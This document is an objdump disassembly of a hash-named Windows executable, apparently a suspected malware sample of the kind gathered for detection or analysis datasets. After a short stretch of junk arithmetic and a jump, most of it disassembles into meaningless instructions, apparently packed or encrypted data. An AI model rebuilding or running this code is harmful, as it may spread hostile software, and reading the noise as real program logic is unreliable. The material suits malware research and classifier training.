
daa8a0de4a2b61ff15f296886c54156088812a6ca601c525265d557ce17cb8ad.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    eax,DWORD PTR [ebp-0x50]
  401009:	mov    ecx,DWORD PTR [ebp-0x4c]
  40100c:	mov    edx,DWORD PTR [ebp-0x50]
  40100f:	sbb    DWORD PTR ds:0x42295a,0x42291e
  401019:	sub    eax,edx
  40101b:	push   edi
  40101c:	mov    edx,0x159a
  401021:	mov    edi,DWORD PTR [ebp-0x4c]
  401024:	mov    DWORD PTR [ebp-0x50],eax
  401027:	sbb    ecx,edi
  401029:	add    eax,eax
  40102b:	mov    DWORD PTR [ebp-0x4c],ecx
  40102e:	or     DWORD PTR [ebp-0x50],0xba68fc47
  401035:	or     DWORD PTR [ebp-0x4c],0x9c0a89d8
  40103c:	mov    eax,DWORD PTR [ebp-0x58]
  40103f:	mov    ecx,DWORD PTR [ebp-0x54]
  401042:	inc    edi
  401043:	mov    edx,DWORD PTR [ebp-0x58]
  401046:	adc    DWORD PTR ds:0x4228c2,0x7b28
  401050:	mov    edi,DWORD PTR [ebp-0x54]
  401053:	sub    eax,edx
  401055:	mov    edx,DWORD PTR ds:0x422926
  40105b:	mov    DWORD PTR [ebp-0x58],eax
  40105e:	sbb    ecx,edi
  401060:	xor    DWORD PTR ds:0x422936,ecx
  401066:	mov    DWORD PTR [ebp-0x54],ecx
  401069:	adc    edx,0x6dea
  40106f:	or     DWORD PTR [ebp-0x58],0xba68805f
  401076:	or     DWORD PTR [ebp-0x54],0x9c0a89d8
  40107d:	lea    eax,[ebp+0x20]
  401080:	mov    DWORD PTR [ebp-0xc],eax
  401083:	add    edx,edx
  401085:	mov    eax,ds:0x4220e0
  40108a:	mov    ecx,DWORD PTR [ebp-0xc]
  40108d:	mov    eax,DWORD PTR [eax]
  40108f:	xor    DWORD PTR ds:0x42293a,0x72a2
  401099:	add    eax,DWORD PTR [ecx]
  40109b:	xor    edx,edx
  40109d:	or     edx,DWORD PTR ds:0x422a4a
  4010a3:	mov    edx,DWORD PTR [edx]
  4010a5:	and    DWORD PTR ds:0x42299e,edx
  4010ab:	jmp    0x401635
  4010b0:	and    eax,0xffffffe4
  4010b3:	xor    eax,0xa0123954
  4010b8:	sbb    al,0x80
  4010ba:	mov    WORD PTR [esi+0x54],gs
  4010bd:	pop    edx
  4010be:	sub    dh,BYTE PTR [esi+edx*1+0x3d161616]
  4010c5:	add    al,0x16
  4010c7:	push   ss
  4010c8:	inc    eax
  4010c9:	and    al,0xb5
  4010cb:	out    dx,al
  4010cc:	jle    0x401052
  4010ce:	inc    eax
  4010cf:	mov    edi,0x241cf639
  4010d4:	dec    ecx
  4010d5:	popf   
  4010d6:	mov    al,ds:0x39074fbf
  4010db:	fadd   st(0),st
  4010dd:	test   bl,dl
  4010df:	clc    
  4010e0:	es push ebp
  4010e2:	lds    ecx,FWORD PTR [ecx]
  4010e4:	push   eax
  4010e5:	mov    dl,0xfe
  4010e7:	test   DWORD PTR [ecx+0x7894fd68],0xfdcbb128
  4010f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010f2:	dec    esi
  4010f3:	sbb    DWORD PTR [eax+0x38],ecx
  4010f6:	xor    BYTE PTR [eax-0x36c9554f],dl
  4010fc:	pop    es
  4010fd:	cmp    edi,ebx
  4010ff:	dec    edx
  401100:	rcl    edx,cl
  401102:	inc    eax
  401103:	inc    ebp
  401104:	push   ecx
  401105:	jl     0x40110c
  401107:	pop    ss
  401108:	mov    esi,DWORD PTR [ebx-0x30]
  40110b:	dec    edx
  40110c:	dec    ebp
  40110d:	dec    esi
  40110e:	ror    BYTE PTR [eax+0x5f42789e],0x3a
  401115:	or     dl,bh
  401117:	mov    al,ds:0x42d8f959
  40111c:	daa    
  40111d:	bound  edi,QWORD PTR [edi-0x1d]
  401120:	scas   eax,DWORD PTR es:[edi]
  401121:	test   eax,0xa527f95d
  401126:	mov    ch,0x94
  401128:	pop    ds
  401129:	push   ss
  40112a:	inc    edi
  40112b:	fdiv   DWORD PTR [edx]
  40112d:	imul   esi,esp,0xd0d5aab1
  401133:	mov    eax,0x2ca27ede
  401138:	jecxz  0x4011a2
  40113a:	add    esp,DWORD PTR [ecx]
  40113c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40113d:	inc    ebp
  40113e:	fucomp st(6)
  401140:	loopne 0x401178
  401142:	mov    ds:0xf9f819cb,al
  401147:	hlt    
  401148:	push   ss
  401149:	rcl    DWORD PTR [ecx+0xd],1
  40114c:	out    0x16,eax
  40114e:	jmp    0xf33c01
  401153:	rol    esi,1
  401155:	retf   
  401156:	mov    dh,0x34
  401158:	xor    bh,dl
  40115a:	push   edx
  40115b:	and    BYTE PTR [ecx-0x7eb27591],bl
  401161:	inc    ebp
  401162:	fiadd  DWORD PTR [edx+0x1c2d82ea]
  401168:	icebp  
  401169:	xor    DWORD PTR [esi],ebx
  40116b:	aaa    
  40116c:	clc    
  40116d:	xor    bh,BYTE PTR [esi]
  40116f:	repnz adc cl,0x85
  401173:	ret    
  401174:	daa    
  401175:	mov    al,0x40
  401177:	into   
  401178:	push   ds
  401179:	outs   dx,BYTE PTR ds:[esi]
  40117a:	loope  0x4011ea
  40117c:	in     al,dx
  40117d:	sbb    ah,BYTE PTR [ebp-0x38]
  401180:	in     eax,0x43
  401182:	in     al,0xce
  401184:	mov    dl,0x76
  401186:	test   BYTE PTR [esi],0x4a
  401189:	xchg   ecx,eax
  40118a:	xchg   DWORD PTR [eax-0x1f],ecx
  40118d:	cmp    bh,cl
  40118f:	gs mov esi,0xa42bc06a
  401195:	pop    ds
  401196:	inc    edi
  401197:	outs   dx,DWORD PTR ds:[esi]
  401198:	adc    BYTE PTR [eax],bl
  40119a:	pop    ds
  40119b:	adc    edx,edx
  40119d:	pop    ecx
  40119e:	inc    edi
  40119f:	inc    edx
  4011a0:	jle    0x40114f
  4011a2:	iret   
  4011a3:	jo     0x40116f
  4011a5:	cmp    dh,dh
  4011a7:	sbb    DWORD PTR [eax],edi
  4011a9:	(bad)  
  4011aa:	jb     0x401159
  4011ac:	add    DWORD PTR [edi],0x679cf6e8
  4011b2:	addr16 pusha 
  4011b4:	mov    edx,DWORD PTR [ebx]
  4011b6:	popa   
  4011b7:	mov    ecx,edi
  4011b9:	repnz or BYTE PTR [eax+0x1bde60e3],dl
  4011c0:	lods   al,BYTE PTR ds:[esi]
  4011c1:	jno    0x401231
  4011c3:	sub    BYTE PTR [ecx+ebp*2],0xff
  4011c7:	test   al,0x3e
  4011c9:	xchg   ecx,eax
  4011ca:	hlt    
  4011cb:	std    
  4011cc:	ins    DWORD PTR es:[edi],dx
  4011cd:	mov    ebp,0x6922b23c
  4011d2:	or     al,0xb7
  4011d4:	retf   
  4011d5:	(bad)  [edi-0x1a39dd2c]
  4011db:	lds    edi,FWORD PTR [edx+0x662ed857]
  4011e1:	adc    ch,BYTE PTR [esi-0x61625ab6]
  4011e7:	or     DWORD PTR [esi-0x46],edi
  4011ea:	xor    eax,0x9d10c16b
  4011ef:	jge    0x4011fb
  4011f1:	aas    
  4011f2:	mov    dl,cl
  4011f4:	xchg   ebp,eax
  4011f5:	imul   ebx,DWORD PTR [edi+0x39ad64a9],0x5f
  4011fc:	out    dx,eax
  4011fd:	mov    esp,DWORD PTR [edx+ecx*2-0x18744eea]
  401204:	shr    DWORD PTR [ecx+0x52b2befc],cl
  40120a:	sbb    edx,DWORD PTR [eax-0x16]
  40120d:	loopne 0x401266
  40120f:	mov    bh,0x1e
  401211:	pushf  
  401212:	or     bl,ah
  401214:	inc    esp
  401215:	push   edx
  401216:	jg     0x4011c7
  401218:	sbb    BYTE PTR [edx+ebp*1-0x3df225d0],dh
  40121f:	push   ecx
  401220:	aaa    
  401221:	retf   0x46a1
  401224:	out    0x8,al
  401226:	ins    BYTE PTR es:[edi],dx
  401227:	or     DWORD PTR [esp+esi*4],ebx
  40122a:	rcr    bl,cl
  40122c:	ds (bad) 
  40122f:	or     BYTE PTR [edi-0x43],bh
  401232:	cmp    DWORD PTR [ebx],ebx
  401234:	test   ebp,eax
  401236:	mov    ch,0x34
  401238:	pop    ecx
  401239:	xchg   edi,eax
  40123a:	dec    edi
  40123b:	sbb    al,0xd4
  40123d:	mov    eax,ds:0x326c70e3
  401242:	gs out dx,eax
  401244:	xor    DWORD PTR [edi-0x58],edx
  401247:	js     0x40121e
  401249:	xor    DWORD PTR [edi],esp
  40124b:	shl    BYTE PTR [eax+0x3777cb45],cl
  401251:	ins    BYTE PTR es:[edi],dx
  401252:	scas   eax,DWORD PTR es:[edi]
  401253:	mov    cl,0xd0
  401255:	jmp    0xbfa4:0x922bced4
  40125c:	adc    eax,edx
  40125e:	lods   eax,DWORD PTR ds:[esi]
  40125f:	cmc    
  401260:	and    bl,BYTE PTR [edx-0x76]
  401263:	in     eax,dx
  401264:	and    ecx,DWORD PTR [ebx-0x2270cc8a]
  40126a:	mov    ds:0xb2443b01,eax
  40126f:	sub    DWORD PTR [edi],ecx
  401271:	dec    edi
  401272:	loopne 0x4012cb
  401274:	pop    di
  401276:	push   ss
  401277:	cli    
  401278:	in     eax,dx
  401279:	into   
  40127a:	sub    ch,BYTE PTR [ebx-0x8]
  40127d:	into   
  40127e:	stos   BYTE PTR es:[edi],al
  40127f:	and    cl,BYTE PTR [eax]
  401281:	mov    WORD PTR [ebp+0x573f1393],?
  401287:	push   esi
  401288:	or     BYTE PTR [esi],al
  40128a:	sbb    eax,0xac53d826
  40128f:	pop    ecx
  401290:	(bad)  
  401291:	xor    dh,ah
  401293:	push   es
  401294:	xlat   BYTE PTR ds:[ebx]
  401295:	jg     0x40127f
  401297:	fisubr WORD PTR [edi+0x17]
  40129a:	fild   QWORD PTR [edi+ebx*4+0x351f39e7]
  4012a1:	mov    esp,0xf1fbdf5f
  4012a6:	cmp    BYTE PTR [ecx+0x60],bl
  4012a9:	sub    ch,BYTE PTR [edi+edi*2+0x52]
  4012ad:	adc    DWORD PTR [ecx-0x178b0eef],edi
  4012b3:	push   cs
  4012b4:	push   ebx
  4012b5:	cmc    
  4012b6:	loope  0x4012f3
  4012b8:	pop    esp
  4012b9:	pop    edx
  4012ba:	or     BYTE PTR [esp+edi*1-0x3c80e1a0],dl
  4012c1:	int    0x20
  4012c3:	jg     0x4012e7
  4012c5:	inc    ecx
  4012c6:	jl     0x401347
  4012c8:	loope  0x401337
  4012ca:	addr16 retf 
  4012cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012cd:	add    ch,BYTE PTR [eax+0x54]
  4012d0:	sti    
  4012d1:	fs rol BYTE PTR fs:[ebx+0x50086525],0xbb
  4012da:	sahf   
  4012db:	and    BYTE PTR [edx-0x25],dl
  4012de:	retf   
  4012df:	dec    eax
  4012e0:	jns    0x401273
  4012e2:	mov    bh,0x65
  4012e4:	inc    ebp
  4012e5:	arpl   WORD PTR [edx],bx
  4012e7:	xchg   edx,eax
  4012e8:	fs push edx
  4012ea:	arpl   WORD PTR [edi+ebx*1],si
  4012ed:	or     eax,0x39053c8b
  4012f2:	test   DWORD PTR [ebp-0x4a],eax
  4012f5:	inc    esi
  4012f6:	or     DWORD PTR [edx],0x22fb8375
  4012fc:	push   esi
  4012fd:	or     DWORD PTR [edx],edi
  4012ff:	mov    eax,0x65cf5559
  401304:	(bad)
  401307:	in     al,0x2c
  401309:	mov    edi,0x36cb3ffd
  40130e:	jl     0x40131e
  401310:	cli    
  401311:	outs   dx,BYTE PTR ds:[esi]
  401312:	test   BYTE PTR [eax-0x566bb0de],0x6d
  401319:	daa    
  40131a:	sub    BYTE PTR [edx+0x63da9bc0],0x43
  401321:	ss test al,0xc4
  401324:	pop    esp
  401325:	xchg   ebx,eax
  401326:	pop    ecx
  401327:	add    eax,0xd72d1db6
  40132c:	jnp    0x401300
  40132e:	mov    BYTE PTR [ebx],ch
  401330:	in     eax,dx
  401331:	retf   0x33c1
  401334:	ins    DWORD PTR es:[edi],dx
  401335:	mov    cl,dl
  401337:	popf   
  401338:	jo     0x4013b4
  40133a:	jle    0x401306
  40133c:	into   
  40133d:	or     BYTE PTR [edi-0x390842a5],ah
  401343:	fs popf 
  401345:	add    eax,0x4a0b4a96
  40134a:	inc    ecx
  40134b:	in     al,dx
  40134c:	sub    eax,0xedd30c6
  401351:	xchg   BYTE PTR [edi+0x9],cl
  401354:	adc    ch,ah
  401356:	or     ebp,DWORD PTR [eax+0x6b8d8465]
  40135c:	mov    cl,0x54
  40135e:	and    dl,BYTE PTR [ebp-0x669b24f9]
  401364:	scas   al,BYTE PTR es:[edi]
  401365:	mov    ah,0xaf
  401367:	jnp    0x40137f
  401369:	daa    
  40136a:	aas    
  40136b:	rcl    BYTE PTR [eax],cl
  40136d:	or     BYTE PTR [edi+ebx*8-0x2e],dl
  401371:	push   0x377c4116
  401376:	xor    DWORD PTR [edi+eiz*8],esp
  401379:	mov    esp,0xf260ad9a
  40137e:	cmp    BYTE PTR [ebx],al
  401380:	or     ch,0xd0
  401383:	rcl    BYTE PTR [edi-0x6e645ffd],0x9d
  40138a:	add    al,0x9c
  40138c:	out    dx,eax
  40138d:	mov    DWORD PTR [edi-0x14],ecx
  401390:	ret    
  401391:	jnp    0x40137c
  401393:	and    ch,dl
  401395:	jmp    0x5cf4:0x24b3cf88
  40139c:	jne    0x4013a8
  40139e:	mov    ecx,DWORD PTR [edx]
  4013a0:	les    esi,FWORD PTR [ebx-0x3]
  4013a3:	or     edx,DWORD PTR [esi-0x7af4fb8d]
  4013a9:	add    eax,0xae9a34fd
  4013ae:	add    DWORD PTR ds:0xa16bea89,ecx
  4013b4:	jno    0x401358
  4013b6:	ins    DWORD PTR es:[edi],dx
  4013b7:	das    
  4013b8:	sub    BYTE PTR [ecx-0x21e1e48e],bl
  4013be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013c0:	push   esp
  4013c1:	loop   0x401362
  4013c3:	in     al,dx
  4013c4:	xchg   edx,eax
  4013c5:	cmp    BYTE PTR [ecx-0xe],dl
  4013c8:	push   eax
  4013c9:	pop    ebx
  4013ca:	test   al,0x75
  4013cc:	inc    ecx
  4013cd:	cmc    
  4013ce:	popa   
  4013cf:	sbb    DWORD PTR [edi+0x1],0x70
  4013d3:	(bad)  
  4013d4:	out    0x4a,al
  4013d6:	inc    ebp
  4013d7:	(bad)  
  4013d8:	stos   DWORD PTR es:[edi],eax
  4013d9:	mov    al,0x13
  4013db:	sub    ebx,DWORD PTR [edi+0x56]
  4013de:	sbb    ecx,DWORD PTR [edx+0x3d3fa21f]
  4013e4:	sub    eax,0x52454061
  4013e9:	xchg   ebx,ecx
  4013eb:	push   ebp
  4013ec:	cmp    DWORD PTR [eax],esi
  4013ee:	xchg   DWORD PTR [ebx+0x3a86805],eax
  4013f4:	pop    esi
  4013f5:	hlt    
  4013f6:	jecxz  0x4013f1
  4013f8:	dec    eax
  4013f9:	xor    eax,0x2cf6ab02
  4013fe:	test   al,0x38
  401400:	sbb    eax,0xb5789c4a
  401405:	mov    ds,WORD PTR [ebx-0x3de8da2]
  40140b:	or     BYTE PTR [edx-0x57],dh
  40140e:	adc    BYTE PTR [eax-0x117e86b6],cl
  401414:	scas   eax,DWORD PTR es:[edi]
  401415:	out    dx,al
  401416:	cmp    eax,0xb7b44525
  40141b:	sar    esp,0xca
  40141e:	mov    bh,0x18
  401420:	loopne 0x4013e5
  401422:	pop    es
  401423:	test   DWORD PTR [edx+0x139f3c58],0x8e3542ef
  40142d:	xchg   eax,eax
  40142f:	bound  esp,QWORD PTR [ebx-0x28da6a83]
  401435:	jbe    0x4013dc
  401437:	cwde   
  401438:	loope  0x40146c
  40143a:	pop    ss
  40143b:	addr16 jmp 0x80807b60
  401441:	xor    DWORD PTR [edx+0x7d85d2],esi
  401447:	dec    ecx
  401448:	mov    eax,0xcbecd923
  40144d:	iret   
  40144e:	and    edx,eax
  401450:	mov    ah,0x9d
  401452:	xor    al,0xba
  401454:	rcl    DWORD PTR [edx-0x2e],0xaf
  401458:	sub    dh,BYTE PTR es:[ecx]
  40145b:	fwait
  40145c:	or     eax,0x2df33846
  401461:	call   0xd59c:0x4359d62c
  401468:	loope  0x4013f6
  40146a:	or     ecx,DWORD PTR [ecx+0x3b8090e0]
  401470:	rcr    BYTE PTR [ecx],cl
  401472:	and    esp,DWORD PTR [eax-0x429c70ed]
  401478:	and    dh,BYTE PTR [eax-0x7e70c490]
  40147e:	mov    dl,0xde
  401480:	pop    esp
  401481:	(bad)  
  401482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401483:	std    
  401484:	bound  edx,QWORD PTR [edi+ebp*2-0x3f]
  401488:	inc    edi
  401489:	out    dx,al
  40148a:	xchg   esi,eax
  40148b:	jnp    0x40143c
  40148d:	or     esp,DWORD PTR [edx-0x31d6daeb]
  401493:	adc    BYTE PTR [ecx],dh
  401495:	and    DWORD PTR [ebx+0x35],edx
  401498:	xor    edx,DWORD PTR [ebx-0x4c059635]
  40149e:	adc    bh,BYTE PTR [edx]
  4014a0:	and    eax,0x23d49710
  4014a5:	mov    ebp,0xd24aefbc
  4014aa:	mov    ah,0x36
  4014ac:	jnp    0x401477
  4014ae:	loop   0x401434
  4014b0:	out    0x41,eax
  4014b2:	jle    0x4014f2
  4014b4:	out    dx,al
  4014b5:	pop    ebx
  4014b6:	rol    eax,cl
  4014b8:	mov    esp,DWORD PTR [edi+0x5b]
  4014bb:	dec    ebx
  4014bc:	mov    edi,0x9036324
  4014c1:	out    0xfb,eax
  4014c3:	dec    eax
  4014c4:	adc    eax,0xdce42586
  4014c9:	call   0x5768:0xef6cd111
  4014d0:	hlt    
  4014d1:	mov    WORD PTR [ebp-0x13c95d54],ds
  4014d7:	test   eax,0xec35e96c
  4014dc:	aaa    
  4014dd:	lahf   
  4014de:	adc    DWORD PTR [edx+0x10],0x45c36366
  4014e5:	lods   eax,DWORD PTR ds:[esi]
  4014e6:	test   eax,0xfb42576
  4014eb:	fadd   QWORD PTR ds:0xecea8a8d
  4014f1:	pop    ds
  4014f2:	fstp   DWORD PTR [eax]
  4014f4:	dec    edx
  4014f5:	cmp    al,0x2b
  4014f7:	sbb    al,0x67
  4014f9:	(bad)  
  4014fa:	std    
  4014fb:	xor    eax,0xdff19ef8
  401500:	adc    bh,BYTE PTR [ecx]
  401502:	adc    ah,ch
  401504:	ror    DWORD PTR [eax],0xef
  401507:	mov    ebx,0x819f6992
  40150c:	and    bl,BYTE PTR [eax]
  40150e:	xor    bl,al
  401510:	cli    
  401511:	pop    ebx
  401512:	add    eax,0xdf854b75
  401517:	cmp    al,0x86
  401519:	fwait
  40151a:	dec    esp
  40151b:	inc    edi
  40151c:	inc    edx
  40151d:	mov    al,ds:0xeae37af4
  401522:	jmp    0xe9731ff7
  401527:	xor    al,BYTE PTR [esp+edi*2+0x1f145400]
  40152e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40152f:	cmc    
  401530:	test   al,0xf8
  401532:	pusha  
  401533:	inc    ecx
  401534:	push   ds
  401535:	or     eax,0xea5a057b
  40153a:	data16 fild DWORD PTR gs:[eax+eax*4-0x3f2f97d3]
  401543:	push   eax
  401544:	dec    ebx
  401545:	mov    dl,bl
  401547:	call   DWORD PTR [ebx-0x7cc3dc9]
  40154d:	bound  ecx,QWORD PTR [ecx+ebx*1-0x72]
  401551:	push   esi
  401552:	call   0x736b34e2
  401557:	test   al,0x6c
  401559:	inc    esp
  40155a:	and    al,0x4d
  40155c:	pushf  
  40155d:	retf   
  40155e:	test   al,0x20
  401560:	lock sar ebx,cl
  401563:	jl     0x401559
  401565:	cmc    
  401566:	das    
  401567:	arpl   bx,sp
  401569:	es cld 
  40156b:	adc    al,0xc0
  40156d:	mov    esi,0x9a215827
  401572:	cmp    dh,BYTE PTR [ebx]
  401574:	pop    esi
  401575:	mov    ch,0x61
  401577:	loop   0x4015b3
  401579:	aam    0xb0
  40157b:	and    bh,BYTE PTR [ecx-0x57]
  40157e:	mov    dl,0x54
  401580:	std    
  401581:	aad    0xd1
  401583:	xor    DWORD PTR [ebx-0x47],0xe804939d
  40158a:	jb     0x40155c
  40158c:	neg    BYTE PTR [edx+0x57]
  40158f:	and    eax,0x4a6e786c
  401594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401595:	xchg   ebx,eax
  401596:	retf   0x592e
  401599:	pop    esi
  40159a:	adc    dl,ch
  40159c:	fmul   QWORD PTR [eax]
  40159e:	fcomp  DWORD PTR [ebp+0x2b]
  4015a1:	int3   
  4015a2:	js     0x401541
  4015a4:	fmul   st(5),st
  4015a6:	sub    BYTE PTR [edx],dh
  4015a8:	and    DWORD PTR [eax+0x65],edi
  4015ab:	sub    ebp,ecx
  4015ad:	sub    eax,DWORD PTR [edi]
  4015af:	xchg   ecx,eax
  4015b0:	adc    ah,bh
  4015b2:	ds jge 0x401605
  4015b5:	jo     0x401563
  4015b7:	pop    ds
  4015b8:	outs   dx,DWORD PTR ds:[esi]
  4015b9:	rcr    ebx,1
  4015bb:	leave  
  4015bc:	(bad)  
  4015bd:	(bad)  
  4015be:	xchg   ebx,eax
  4015bf:	ins    DWORD PTR es:[edi],dx
  4015c0:	jb     0x4015f7
  4015c2:	adc    BYTE PTR [edx+0x519f6dfb],al
  4015c8:	sbb    dh,al
  4015ca:	ja     0x4015af
  4015cc:	cmp    al,0x13
  4015ce:	pop    edx
  4015cf:	push   edi
  4015d0:	and    ecx,DWORD PTR [ebx+0x28747189]
  4015d6:	call   0xeef7:0x2ba7b3cb
  4015dd:	lods   al,BYTE PTR ds:[esi]
  4015de:	mov    bl,0x25
  4015e0:	mov    ds:0xe2ce1f95,eax
  4015e5:	pop    ss
  4015e6:	stos   BYTE PTR es:[edi],al
  4015e7:	sub    DWORD PTR [eax+edx*2-0x13],esp
  4015eb:	jp     0x40159d
  4015ed:	test   eax,0xc04906f3
  4015f2:	jne    0x4015b7
  4015f4:	data16 cmc 
  4015f6:	xor    BYTE PTR [edi+0x5529712c],dl
  4015fc:	sub    DWORD PTR [eax],esp
  4015fe:	pop    eax
  4015ff:	and    al,0xef
  401601:	ds mov bh,0x4b
  401604:	xchg   ebx,eax
  401605:	pop    ebx
  401606:	ror    BYTE PTR [esi],cl
  401608:	xor    al,dl
  40160a:	out    dx,eax
  40160b:	in     al,dx
  40160c:	pop    ebx
  40160d:	stos   BYTE PTR es:[edi],al
  40160e:	xchg   DWORD PTR [ebx],esi
  401610:	cmp    DWORD PTR [esi-0x4e75b95b],0x64e1ebac
  40161a:	jbe    0x4015a6
  40161c:	fimul  DWORD PTR [esp+esi*4+0x70]
  401620:	push   esp
  401621:	sbb    ah,BYTE PTR [eax]
  401623:	outs   dx,DWORD PTR ds:[esi]
  401624:	adc    ah,BYTE PTR [ecx+0x102de758]
  40162a:	or     eax,0x4d9b23e5
  40162f:	xchg   ch,cl
  401631:	or     al,BYTE PTR [ecx-0x1d]
  401634:	mov    edx,0x9a655cbf
  401639:	xor    edx,DWORD PTR cs:0x4228e2
  401640:	mov    DWORD PTR [ebp-0x14],eax
  401643:	add    DWORD PTR ds:0x4228a6,ebx
  401649:	mov    eax,DWORD PTR [ebp+0x18]
  40164c:	jmp    0x401bd6
  401651:	fdivr  DWORD PTR [ebp+0x2c]
  401654:	lds    ebp,FWORD PTR [eax]
  401656:	xchg   esp,eax
  401657:	pop    eax
  401658:	and    BYTE PTR [ecx-0x7c4d3155],dl
  40165e:	adc    ecx,edx
  401660:	outs   dx,BYTE PTR ds:[esi]
  401661:	cmp    eax,0x3d161604
  401666:	add    al,0x16
  401668:	push   ss
  401669:	add    ecx,DWORD PTR [ecx+0x39]
  40166c:	sub    al,0x48
  40166e:	call   0x2fc1de52
  401673:	js     0x401655
  401675:	aaa    
  401676:	(bad)  
  401677:	addr16 leave 
  401679:	imul   DWORD PTR [ecx]
  40167b:	or     BYTE PTR [ecx-0x7b],dl
  40167e:	pop    ds
  40167f:	mov    DWORD PTR [edi+0x5412d19],esi
  401685:	xchg   ecx,eax
  401686:	or     dh,BYTE PTR [esi]
  401688:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401689:	ror    BYTE PTR [edx-0x5],1
  40168c:	or     dl,BYTE PTR [edi-0x5cc49aa6]
  401692:	out    0xf0,al
  401694:	jle    0x401637
  401696:	(bad)  
  401697:	jno    0x401652
  401699:	dec    ebp
  40169a:	cmp    al,0xda
  40169c:	add    edx,edx
  40169e:	jp     0x4016ab
  4016a0:	pop    esp
  4016a1:	pop    es
  4016a2:	mov    edx,0xb09bd7dd
  4016a7:	dec    ebx
  4016a8:	leave  
  4016a9:	inc    DWORD PTR [ebx-0x69]
  4016ac:	in     eax,0x30
  4016ae:	cmp    eax,0x835fdb1a
  4016b3:	int3   
  4016b4:	push   ebx
  4016b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016b6:	(bad)  ds:0xd1ee0cd4
  4016bc:	hlt    
  4016bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016be:	and    esp,ebx
  4016c0:	jae    0x401729
  4016c2:	inc    eax
  4016c3:	das    
  4016c4:	adc    eax,0x2837461c
  4016c9:	push   ebx
  4016ca:	data16 mov WORD PTR [edx],fs
  4016cd:	addr16 and edi,DWORD PTR [bx+si-0x54]
  4016d2:	mov    esi,DWORD PTR [esp+ebp*8+0x4e]
  4016d6:	inc    ebp
  4016d7:	lahf   
  4016d8:	sub    eax,0x69e3e58f
  4016dd:	fiadd  DWORD PTR [esp+eiz*2+0x1]
  4016e1:	(bad)  ds:0xbd5d86bb
  4016e7:	mul    eax
  4016e9:	push   ebp
  4016ea:	xor    DWORD PTR [ebp+eiz*4+0x3f],esi
  4016ee:	popf   
  4016ef:	mov    al,0x68
  4016f1:	repnz inc ch
  4016f4:	mov    cl,0xdb
  4016f6:	outs   dx,BYTE PTR ds:[esi]
  4016f7:	lock xor ecx,DWORD PTR [ecx+0x4822c28e]
  4016fe:	dec    esi
  4016ff:	int    0xb2
  401701:	pop    es
  401702:	fidiv  WORD PTR [eax-0x3542f190]
  401708:	sub    al,0x12
  40170a:	pop    es
  40170b:	jle    0x4016fc
  40170d:	cmc    
  40170e:	and    ecx,DWORD PTR [edi+0x25]
  401711:	sbb    edx,DWORD PTR [esi+ebp*4+0x23]
  401715:	mov    ah,0xeb
  401717:	call   0x5109:0xb8d83c37
  40171e:	imul   ebp,DWORD PTR [ebx-0x72],0x62
  401722:	enter  0x20dc,0xc8
  401726:	dec    ebp
  401727:	inc    esp
  401728:	ret    0xf544
  40172b:	ret    0x226c
  40172e:	xchg   ecx,eax
  40172f:	inc    ecx
  401730:	ins    BYTE PTR es:[edi],dx
  401731:	or     al,0xa6
  401733:	les    ebp,FWORD PTR [ecx-0xc]
  401736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401737:	xlat   BYTE PTR ds:[ebx]
  401738:	sbb    DWORD PTR [esp+esi*2+0x11],0x4a59abb
  401740:	pop    edx
  401741:	fisttp QWORD PTR [ebx+0x1c73d9bf]
  401747:	push   0xffffffee
  401749:	mov    ds:0xac81be39,al
  40174e:	popf   
  40174f:	sub    ecx,DWORD PTR [esi+0x47b30341]
  401755:	dec    esi
  401756:	xchg   al,dl
  401758:	ror    DWORD PTR [eax],0xa2
  40175b:	mov    ecx,0xecc374c2
  401760:	push   ebp
  401761:	mov    BYTE PTR [bx+si],al
  401764:	jo     0x4017d6
  401766:	fld    TBYTE PTR [ecx-0xc]
  401769:	cdq    
  40176a:	scas   eax,DWORD PTR es:[edi]
  40176b:	outs   dx,BYTE PTR ds:[esi]
  40176c:	add    al,0x14
  40176e:	pop    edi
  40176f:	fcom   DWORD PTR [eax-0xf]
  401772:	fsubr  st(6),st
  401774:	shl    BYTE PTR [ecx-0x433a52ee],1
  40177a:	push   cs
  40177b:	loopne 0x401797
  40177d:	jno    0x4017bb
  40177f:	icebp  
  401780:	jmp    0x18de:0xaccb4f27
  401787:	aaa    
  401788:	inc    edi
  401789:	clc    
  40178a:	sub    ch,0xd8
  40178d:	sub    ebp,DWORD PTR [ebx]
  40178f:	popf   
  401790:	xor    DWORD PTR [ecx-0xc],edi
  401793:	outs   dx,BYTE PTR ds:[esi]
  401794:	outs   dx,BYTE PTR ds:[esi]
  401795:	out    dx,al
  401796:	lock sbb eax,0x64166d69
  40179c:	jnp    0x40178e
  40179e:	push   es
  40179f:	scas   al,BYTE PTR es:[edi]
  4017a0:	fstp   QWORD PTR [eax+0x5d9454ac]
  4017a6:	adc    ebp,edx
  4017a8:	stos   DWORD PTR es:[edi],eax
  4017a9:	call   FWORD PTR [ebp+0x679b01d2]
  4017af:	test   eax,0x1aeb7597
  4017b4:	es pop ds
  4017b6:	adc    DWORD PTR [edx+edi*4+0x1f],edi
  4017ba:	inc    eax
  4017bb:	adc    DWORD PTR [ebx+0x2465e09d],esp
  4017c1:	add    BYTE PTR [edi-0x4409dbe5],dl
  4017c7:	or     esp,edi
  4017c9:	push   ds
  4017ca:	sub    ah,BYTE PTR [esi+ecx*8]
  4017cd:	mov    ebx,0x4159f95d
  4017d2:	mov    ch,0x1c
  4017d4:	adc    DWORD PTR [esi-0x13],eax
  4017d7:	lahf   
  4017d8:	mov    eax,0xbf54378c
  4017dd:	mov    edi,0xfab0e8db
  4017e2:	pushf  
  4017e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017e4:	sub    BYTE PTR [edi+0x12ed0a90],0xea
  4017eb:	xchg   edx,eax
